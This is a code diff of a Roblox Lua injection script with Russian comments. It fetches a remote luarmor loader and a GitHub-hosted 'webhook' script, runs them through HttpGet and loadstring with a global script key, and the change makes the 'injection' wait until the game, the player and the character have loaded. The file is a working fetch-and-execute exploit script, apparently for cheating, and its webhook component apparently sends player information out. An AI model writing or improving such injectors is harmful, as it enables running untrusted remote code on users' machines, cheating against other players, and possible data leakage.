@@ -3,13 +3,12 @@ local loader_url = "https://api.luarmor.net/files/v3/loaders/180154ec7abc246752b
 local webhook_url = "https://raw.githubusercontent.com/rosel4k/scripts/refs/heads/main/AEwebhook.lua"
 
 -- 2) Функция для безопасного запуска первого лоадера
--- ВАЖНО: script_key объявляется внутри той же функции/потока перед loadstring -> гарантируется, что лоадер увидит переменную
 local function injectLoaderWithKey(key)
     task.spawn(function()
         local ok, err = pcall(function()
-            -- Объявляем глобальную переменную script_key (без local)
+            -- Объявляем глобальную переменную script_key (без local),
+            -- чтобы загружаемый лоадер увидел её в своей среде.
             script_key = key
-            -- Загружаем и выполняем лоадер в той же среде (как если бы вы инжектили его ручками вместе с key)
             local src = game:HttpGet(loader_url, true)
             local fn = loadstring(src)
             if type(fn) ~= "function" then error("loader: loadstring не вернул функцию") end
@@ -51,8 +50,34 @@ local webhook_values = {
     UserId = '143264667521777664',
 }
 
--- 5) Запуск: первый инжект делаем так, чтобы key был в том же инжекте; вебхук стартует параллельно
+-- 5) Ожидаем полной загрузки игры и появления игрока/персонажа
+local Players = game:GetService("Players")
+
+-- Дождаться, пока game пометит себя как загруженный
+if not game:IsLoaded() then
+    -- событие Loaded сработает когда игра полностью загрузится
+    game.Loaded:Wait()
+end
+
+-- Дождаться появления LocalPlayer (в некоторых средах он может появляться с задержкой)
+local player = Players.LocalPlayer
+if not player then
+    repeat
+        task.wait()
+        player = Players.LocalPlayer
+    until player
+end
+
+-- Дождаться персонажа (Character) — полезно если ваш лоадер ожидает наличия Character
+if not player.Character or not player.Character.Parent then
+    player.CharacterAdded:Wait()
+end
+
+-- (Опционально) Небольшая дополнительная пауза, чтобы всё окончательно инициализировалось
+task.wait(0.5)
+
+-- 6) Выполняем инжекты (уже после загрузки)
 injectLoaderWithKey(my_key)
 injectWebhook(webhook_values)
 
--- Готово. Оба скрипта инжектятся почти одновременно.
+print("Injection started after game load.")
